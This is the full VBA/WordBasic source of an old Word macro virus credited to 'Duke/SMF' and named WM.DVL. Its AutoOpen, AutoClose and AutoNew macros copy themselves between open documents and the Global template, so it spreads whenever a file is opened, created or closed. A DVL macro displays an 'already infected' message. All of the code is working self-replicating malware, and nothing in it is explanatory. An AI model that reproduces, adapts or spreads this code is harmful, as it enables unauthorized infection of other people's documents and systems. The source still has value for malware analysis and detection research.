   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Dim Ready
   Dim i
   ' ??????????? ?? ???? ??????????
   Ready = 0

   For i = 1 To WordBasic.CountMacros(1, 0)
      If WordBasic.[MacroName$](i, 1, 1) = "DVL" Then
      Ready = 1
      End If
   Next i

   If Ready = 0 Then
      On Error Resume Next
      WordBasic.FileSaveAs Format:=1
      WordBasic.MacroCopy "Global:DVL", WordBasic.[FileName$]() + ":DVL", 1
      WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", 1
      WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 1
      WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", 1
      WordBasic.FileSaveAll 1, 0
   End If

   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim i
   Dim Ready
   ' ????????? ??????? ?? ????????????
   For i = 1 To WordBasic.CountMacros(0, 0)
      If WordBasic.[MacroName$](i, 0, 0) = "DVL" Then
         Ready = 1
         End If
   Next i

   If Ready = 1 Then
      ' ???? ???????? - ??????? ??????
      WordBasic.Call "DVL"
   Else
      ' ???? ?? ???????? - ?????????? ? ??????? ???????? ????????
      On Error Resume Next
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":DVL", "Global:DVL", 1
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", 1
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", 1
      WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", 1
      WordBasic.Call "AutoClose"
   End If

   End Sub

   Attribute VB_Name = "AutoNew"

   Public Sub MAIN()

   WordBasic.Call "AutoClose"

   End Sub

   Attribute VB_Name = "DVL"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "WM.DVL (c) by Duke/SMF"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.DVL.MAIN"
   ' ??????? ?? ????? ?????? ? ???????
   WordBasic.MsgBox "  You system already infected !" + Chr(13) + _
          "This macros written by Duke/SMF" + Chr(13) + _
          "       special for DVL #4      ", _
          "WM.DVL (c) by Duke/SMF", 64

   End Sub
